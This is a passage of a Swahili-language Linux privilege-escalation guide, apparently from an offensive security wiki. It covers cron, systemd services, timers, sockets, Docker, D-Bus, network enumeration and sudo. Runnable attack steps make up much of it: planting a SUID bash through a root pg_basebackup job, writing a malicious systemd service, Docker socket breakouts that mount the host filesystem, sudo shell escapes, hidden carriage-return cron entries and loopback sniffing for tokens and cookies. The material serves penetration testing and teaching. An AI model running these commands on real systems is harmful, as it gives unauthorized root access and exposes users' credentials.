Mtumiaji wa kawaida anayeweza kuandika binary halisi inayoendeshwa na cron job ya root anaweza kuvuka mpaka wa ruhusa, lakini ukaguzi wa sahihi maalum unaweza kukataa replacement isiyo na sahihi. Katika kesi iliyoandikwa, ELF inayomilikiwa na root ilikuwa na mode `0760`, hivyo kuruhusu mshiriki wa kundi lake kuiandika huku mmiliki wa root akiweza kuiendesha. Ufuatiliaji wa process ulioonekana ulionyesha `objcopy` ikitoa `.text_sig` kabla job haijaendesha binary; script kamili ya verifier haikuweza kusomeka.<sup>[[2]](#references)</sup>

Replacement iliyofaulu ilisainiwa kwa kutumia nyenzo za siri za kusaini zilizovuja, kupitia ELF signer. [Nyaraka za format](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) zinaeleza sehemu ya sahihi inayotokana na `.text` ya executable. Kuongeza tu certificate au string inayolingana kwenye `.text_sig` hakujathibitishwa kuwa kunatosha kwa verifier ambayo haikuonekana. Kabla ya kuhitimisha kuwa binary yenye ruhusa ya kuandikwa inaweza kutumiwa vibaya, kagua path halisi iliyopangwa, ruhusa halisi za kuandika, uendeshaji wa root na sera ya verifier. Sehemu ya `.text_sig` pekee ni kidokezo cha kukagua tu.

### Cron jobs za mara kwa mara

Unaweza kufuatilia processes ili kutafuta zinazotekelezwa kila baada ya dakika 1, 2 au 5. Labda unaweza kunufaika nazo na kuongeza ruhusa zako.

Kwa mfano, ili **kufuatilia kila sekunde 0.1 kwa dakika 1**, **kupanga kwa amri zilizotekelezwa mara chache zaidi** na kufuta amri zilizotekelezwa mara nyingi zaidi, unaweza kufanya:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Backups za root zinazohifadhi mode bits zilizowekwa na mshambuliaji (pg_basebackup)

Ikiwa cron inayomilikiwa na root inaendesha `pg_basebackup` (au nakala nyingine ya kujirudia) dhidi ya directory ya database unayoweza kuiandikia, unaweza kupandikiza **SUID/SGID binary** ambayo itanakiliwa tena ikiwa **root:root** pamoja na mode bits zilezile kwenye matokeo ya backup.<sup>[[26]](#references)</sup>

Mtiririko wa kawaida wa ugunduzi (ukiwa DB user mwenye ruhusa ndogo):
- Tumia `pspy` kugundua cron ya root inayoendesha kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kuwa cluster ya chanzo (kwa mfano, `/var/lib/postgresql/14/main`) unaweza kuiandikia na kwamba eneo lengwa (`/opt/backups/current`) linamilikiwa na root baada ya job kukamilika.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi bits za ruhusa za faili inapokopi cluster; inapoendeshwa na root, faili za mahali pa mwisho hurithi **umiliki wa root + SUID/SGID iliyochaguliwa na mshambuliaji**. Utaratibu wowote kama huo wa backup/copy wenye ruhusa za juu unaohifadhi ruhusa na kuandika kwenye eneo linalotekelezeka uko hatarini.

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya comment** (bila herufi ya newline), na cron job itafanya kazi. Mfano (angalia herufi ya carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Ili kugundua aina hii ya ingizo fiche, kagua faili za cron kwa kutumia zana zinazoonyesha herufi za udhibiti:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia kama unaweza kuandika kwenye faili yoyote ya `.service`. Ukiweza, **unaweza kuirekebisha** ili **itekeleze** **backdoor yako wakati** huduma **inapoanzishwa**, **inapoanzishwa upya** au **inaposimamishwa** (huenda utahitaji kusubiri hadi mashine iwashwe upya).\
Kwa mfano, unda backdoor yako ndani ya faili ya .service kwa kutumia **`ExecStart=/tmp/script.sh`**

### Binary za service zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **ruhusa za kuandika kwenye binary zinazotekelezwa na huduma**, unaweza kuzibadilisha ziwe backdoor ili huduma zitakapotekelezwa tena, backdoor zitekelezwe.

### PATH ya systemd - Njia za Relative

Unaweza kuona PATH inayotumiwa na **systemd** kwa kutumia:

```bash
systemctl show-environment
```

Ikiwa utagundua kuwa unaweza **kuandika** kwenye folda yoyote iliyo kwenye njia hiyo, huenda ukaweza **kupandisha marupurupu**. Unapaswa kutafuta **relative paths zinazotumiwa kwenye faili za usanidi wa huduma** kama:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Kisha, tengeneza **programu inayoweza kutekelezwa** yenye **jina sawa na binary ya relative path** ndani ya folda ya systemd PATH unayoweza kuandika, na huduma inapoombwa kutekeleza kitendo kilicho hatarini (**Start**, **Stop**, **Reload**), **backdoor yako itatekelezwa** (kwa kawaida, watumiaji wasio na ruhusa za juu hawawezi kuanzisha/kusimamisha huduma, lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu huduma kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni faili za unit za systemd ambazo majina yake huishia kwa `**.timer**`, na hudhibiti faili za `**.service**` au matukio. **Timers** zinaweza kutumika badala ya cron kwa kuwa zina usaidizi wa ndani wa matukio ya muda wa kalenda na matukio ya muda wa monotonic, na zinaweza kuendeshwa bila kusubiri.

Unaweza kuorodhesha timers zote kwa kutumia:

```bash
systemctl list-timers --all
```

### Timers zinazoweza kuhaririwa

Ikiwa unaweza kurekebisha timer, unaweza kuifanya itekeleze baadhi ya systemd.unit zilizopo (kama `.service` au `.target`)

```bash
Unit=backdoor.service
```

Katika nyaraka unaweza kusoma maelezo kuhusu Unit:

> Unit itakayowashwa muda wa timer unapoisha. Hoja ni jina la unit, ambalo kiambishi tamati chake si ".timer". Ikiwa halijabainishwa, thamani hii huwa service yenye jina sawa na unit ya timer, isipokuwa kiambishi tamati. (Tazama hapo juu.) Inapendekezwa kuwa jina la unit inayowashwa na jina la unit ya timer yafanane, isipokuwa viambishi tamati.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Kupata unit fulani ya systemd (kama `.service`) ambayo **inatekeleza binary inayoweza kuandikwa**
- Kupata unit fulani ya systemd ambayo **inatekeleza njia ya relative** na una **ruhusa za kuandika** kwenye **systemd PATH** (ili kujifanya kuwa executable hiyo)

**Jifunze zaidi kuhusu timers ukitumia `man systemd.timer`.**

### **Kuwasha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kutekeleza:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Kumbuka kwamba **timer** **huwashwa** kwa kuunda symlink yake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano ya michakato** kwenye mashine ileile au tofauti ndani ya modeli za client-server. Hutumia faili za kawaida za Unix descriptor kwa mawasiliano kati ya kompyuta na huwekwa kupitia faili za `.socket`.<sup>[[14]](#references)</sup>

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa kutumia `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi ni tofauti, lakini kwa muhtasari **huonyesha mahali itakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port ya kusikiliza, n.k.)
- `Accept`: Hupokea argument ya boolean. Ikiwa **ni true**, **instance ya service huanzishwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndiyo hupitishwa kwake. Ikiwa **ni false**, sockets zote zinazosikiliza **hupitishwa zenyewe kwa unit ya service iliyoanzishwa**, na unit moja tu ya service huanzishwa kwa miunganisho yote. Thamani hii hupuuzwa kwa datagram sockets na FIFOs, ambapo unit moja ya service hushughulikia bila masharti traffic yote inayoingia. **Chaguo-msingi ni false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya kwa namna inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Hupokea mstari mmoja au zaidi wa amri, ambazo **huendeshwa kabla** au **baada** ya **sockets**/FIFOs zinazosikiliza **kuundwa** na kufungwa, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili kamili, kisha ifuatwe na arguments za mchakato.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo **huendeshwa kabla** au **baada** ya **sockets**/FIFOs zinazosikiliza **kufungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la unit ya **service** **itakayowashwa** kunapokuwa na **traffic inayoingia**. Mpangilio huu unaruhusiwa tu kwa sockets zilizo na Accept=no. Chaguo-msingi ni service yenye jina sawa na socket (isipokuwa suffix imebadilishwa). Mara nyingi, hakuna haja ya kutumia chaguo hili.

### Faili za .socket zinazoweza kuandikwa

Ukipata faili ya `.socket` **inayoweza kuandikwa**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama hiki: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itaendeshwa kabla socket haijaumbwa. Kwa hivyo, **huenda utahitaji kusubiri hadi mashine iwashwe upya.**\
_Kumbuka kwamba mfumo lazima uwe unatumia usanidi wa faili hiyo ya socket, la sivyo backdoor haitaendeshwa_

### Socket activation + njia ya unit inayoweza kuandikwa (unda service inayokosekana)

Upangaji mwingine usio sahihi wenye athari kubwa ni:

- unit ya socket yenye `Accept=no` na `Service=<name>.service`
- unit ya service inayorejelewa haipo
- mshambulizi anaweza kuandika kwenye `/etc/systemd/system` (au njia nyingine ya kutafutia unit)

Katika hali hiyo, mshambulizi anaweza kuunda `<name>.service`, kisha kuanzisha traffic kwenye socket ili systemd ipakie na kuendesha service mpya kama root.

Mtiririko wa haraka:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Soketi zinazoweza kuandikwa

Uk **tambua soketi yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets, si faili za usanidi za `.socket`_), basi **unaweza kuwasiliana** na soketi hiyo na huenda ukatumia udhaifu.

### Orodhesha Unix Sockets

```bash
netstat -a -p --unix
```

### Muunganisho ghafi

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation mfano:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa huenda kukawa na baadhi ya **sockets zinazotegemea maombi ya HTTP** (_sizungumzii faili za .socket, bali faili zinazofanya kazi kama unix sockets_). Unaweza kukagua hili kwa kutumia:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Ikiwa socket **itajibu ombi la HTTP**, basi unaweza **kuwasiliana** nayo na pengine **kutumia udhaifu fulani**.

### Docker Socket Inayoweza Kuandikwa

Docker socket, ambayo mara nyingi hupatikana katika `/var/run/docker.sock`, ni faili muhimu inayopaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kundi la `docker`. Kuwa na ruhusa ya kuandika kwenye socket hii kunaweza kusababisha upandishaji wa haki. Hivi ndivyo inavyoweza kufanywa, pamoja na njia mbadala ikiwa Docker CLI haipatikani.

#### **Upandishaji wa Haki kwa Kutumia Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye Docker socket, unaweza kupandisha haki kwa kutumia amri zifuatazo:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Amri hizi zinakuwezesha kuendesha container yenye ufikiaji wa kiwango cha root kwenye mfumo wa faili wa host.

#### **Kutumia Docker API Moja kwa Moja**

Docker CLI isipopatikana, bado unaweza kutumia vibaya Docker socket kwa kutuma HTTP ghafi kupitia Unix socket. Mchakato unaotegemeka zaidi ni:

- kuunda container saidizi inayodumu kwa muda mrefu, huku root ya host ikiwekwa kama bind mount
- kuianzisha
- kuunda instance ya `exec` ndani ya container saidizi hiyo
- kuanzisha instance ya `exec` na kusoma matokeo kupitia API

**Orodhesha Docker images**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Unda na uanzishe container saidizi**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Unda instance ya exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Anzisha exec instance na usome matokeo**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Muundo huu kwa kawaida huwa thabiti zaidi kuliko kujaribu kuendesha `attach` mwenyewe kwa kutumia `socat` au `nc -U`. Mara tu unapoweza kuunda helper kwa `/:/host`, unaweza kutumia instances nyingine za `exec` kusoma faili kama `/host/root/...`, kuongeza funguo za SSH chini ya `/host/root/.ssh`, au kurekebisha faili za uanzishaji za host.

### Nyingine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu **uko ndani ya group `docker`**, kuna [**njia zaidi za kuongeza privileges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port**, unaweza pia kuweza kuikompromiti](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoka kwenye containers au kutumia vibaya container runtimes ili kuongeza privileges** katika:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Kuongeza privileges kwa Containerd (ctr)

Ukigundua kwamba unaweza kutumia command ya **`ctr`**, soma ukurasa ufuatao kwa kuwa **unaweza kuweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Kuongeza privileges kwa **RunC**

Ukigundua kwamba unaweza kutumia command ya **`runc`**, soma ukurasa ufuatao kwa kuwa **unaweza kuweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni **mfumo wa mawasiliano kati ya processes (IPC)** wa kisasa unaowezesha applications kuwasiliana na kushiriki data kwa ufanisi. Ukiundwa kwa kuzingatia mfumo wa kisasa wa Linux, hutoa mfumo imara kwa aina mbalimbali za mawasiliano ya applications.<sup>[[16]](#references)</sup>

Mfumo huu unaweza kutumika kwa njia nyingi; unaunga mkono IPC ya msingi inayoboresha ubadilishanaji wa data kati ya processes, kama vile **UNIX domain sockets zilizoboreshwa**. Pia, husaidia kutangaza events au signals, na kurahisisha muunganisho kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayoingia inaweza kufanya music player izime sauti, na hivyo kuboresha matumizi ya mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote objects, unaorahisisha maombi ya services na miito ya methods kati ya applications, na kurahisisha processes ambazo awali zilikuwa changamano.

D-Bus hutumia **modeli ya kuruhusu/kukataa**, inayodhibiti ruhusa za messages (miito ya methods, utumaji wa signals, n.k.) kulingana na athari ya jumla ya policy rules zinazolingana. Policies hizi hubainisha mwingiliano na bus, na huenda zikaruhusu kuongeza privileges kwa kutumia vibaya ruhusa hizi.

Mfano wa policy kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa. Unaeleza ruhusa za mtumiaji root kumiliki, kutuma messages kwa, na kupokea messages kutoka kwa `fi.w1.wpa_supplicant1`.

Policies zisizobainisha user au group hutumika kwa wote, huku policies za muktadha wa "default" zikitumika kwa wote ambao hawajashughulikiwa na policies nyingine mahususi.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Jifunze jinsi ya kufanya enumeration na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila wakati kufanya enumeration ya mtandao na kubaini nafasi ya mashine.

### Enumeration ya jumla

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Ikiwa ingizo la `/etc/inetd.conf` linalotumika linaendesha GNU Inetutils `telnetd` kama root, kagua toleo la binary iliyosanidiwa na listener ya ndani hata kama port imefungwa kwa loopback pekee. GNU Inetutils kuanzia toleo la 1.9.3 hadi 2.7 ilikuwa na [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) ambapo `USER` iliyotolewa na client ilifikishwa kwa `login -f` (CVE-2026-24061). Mchakato au mfuatano wa toleo ni kiashiria; thibitisha hali ya patch ya vendor na daemon halisi kabla ya kuichukulia kuwa iko hatarini. [Mwongozo wa Telnet](../../../network-services-pentesting/pentesting-telnet.md) una maelezo zaidi.

### Uchunguzi wa haraka wa uchujaji wa trafiki inayotoka

Ikiwa host inaweza kutekeleza amri lakini callbacks zinashindwa, bainisha haraka uchujaji wa DNS, transport, proxy na route:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Porti zilizo wazi

Daima kagua huduma za mtandao zinazoendeshwa kwenye mashine ambayo hukuweza kuwasiliana nayo kabla ya kuifikia:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Panga huduma zinazosikiliza kulingana na anwani ya bind:

- `0.0.0.0` / `[::]`: zimefichuliwa kwenye violesura vyote vya ndani.
- `127.0.0.1` / `::1`: zinapatikana ndani ya mashine pekee (zinafaa kwa tunnel/forward).
- IP mahususi za ndani (k.m. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinapatikana tu kutoka kwenye sehemu za mtandao wa ndani.

### Mchakato wa kuchunguza huduma zinazopatikana ndani pekee

Unapodhibiti mashine, huduma zilizofungwa kwenye `127.0.0.1` mara nyingi huwa zinaweza kufikiwa kwa mara ya kwanza kutoka kwenye shell yako. Mchakato wa haraka wa ndani ni:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS kama kichanganuzi cha mtandao (hali ya mtandao pekee)

Mbali na ukaguzi wa ndani wa PE, linPEAS inaweza kufanya kazi kama kichanganuzi maalum cha mtandao. Hutumia binary zinazopatikana kwenye `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi zana.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Ukipitisha `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama network scanner pekee (ikiruka ukaguzi mwingine wote wa privilege escalation).

### Sniffing

Angalia kama unaweza kunusa trafiki. Ukiweza, huenda ukaweza kupata credentials.

```
timeout 1 tcpdump
```

Ukaguzi wa haraka wa vitendo:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) ni muhimu sana katika post-exploitation kwa sababu huduma nyingi zinazopatikana ndani pekee hufichua tokens/cookies/credentials hapo:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Nasa sasa, changanua baadaye:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Watumiaji

### Uchunguzi wa Jumla

Kagua **wewe ni nani**, una **haki gani**, ni **watumiaji** gani waliopo kwenye mifumo, ni yupi anayeweza **login** na ni yupi aliye na **haki za root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na hitilafu inayowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha privileges. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit** kwa kutumia: **`systemd-run -t /bin/bash`**

### Groups

Angalia kama wewe ni **mwanachama wa group fulani** inayoweza kukupa root privileges:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia kama kuna kitu chochote cha kuvutia kwenye clipboard (ikiwezekana)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Sera ya Nenosiri

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Nywila zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa hujali kusababisha kelele nyingi na binaries za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kufanya brute-force kwa watumiaji.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye parameter ya `-a` pia hujaribu kufanya brute-force kwa watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ukigundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH**, unaweza kupandisha privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** yenye jina la amri itakayoendeshwa na mtumiaji mwingine (ikiwezekana root) na ambayo **haipakuliwi kutoka kwenye folda iliyo kabla ya folda yako inayoweza kuandikwa katika $PATH**.

### SUDO na SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au amri hizo zinaweza kuwa na bit ya suid. Iangalie kwa kutumia:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Baadhi ya **amri zisizotarajiwa hukuruhusu kusoma na/au kuandika faili au hata kutekeleza amri**.<sup>[[8]](#references)</sup> Kwa mfano:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nenosiri.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Katika mfano huu, mtumiaji demo anaweza kuendesha vim kama root; sasa ni rahisi sana kupata shell kwa kuongeza ufunguo wa ssh kwenye saraka ya root au kwa kuita sh.

```
sudo vim -c '!sh'
```

### Ulinganisho wa Bash usionukuliwa kwenye script ya sudo

Katika Bash, upande wa kulia wa `[[ "$protected" == $candidate ]]` ni pattern. Ikiwa script ya sudo yenye uwezo wa root inajaza `candidate` kutoka kwenye faili inayodhibitiwa na mpigaji, thamani kama `prefix*` inaweza kulingana na mwanzo wa mfuatano uliolindwa. Njia tofauti za mafanikio na hitilafu zinaweza kufichua prefix oracle. Nukuu upande wa kulia (`[[ "$protected" == "$candidate" ]]`) pale ambapo unakusudia kulinganisha thamani halisi. Kagua hoja halisi za sudo, chanzo cha ingizo na tabia ya matawi inayoweza kuonekana kabla ya kuhitimisha kuwa ulinganisho usionukuliwa unaweza kutumiwa vibaya. [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) inafafanua tabia hii ya pattern.

### Faili za mradi za PrusaSlicer chini ya sudo

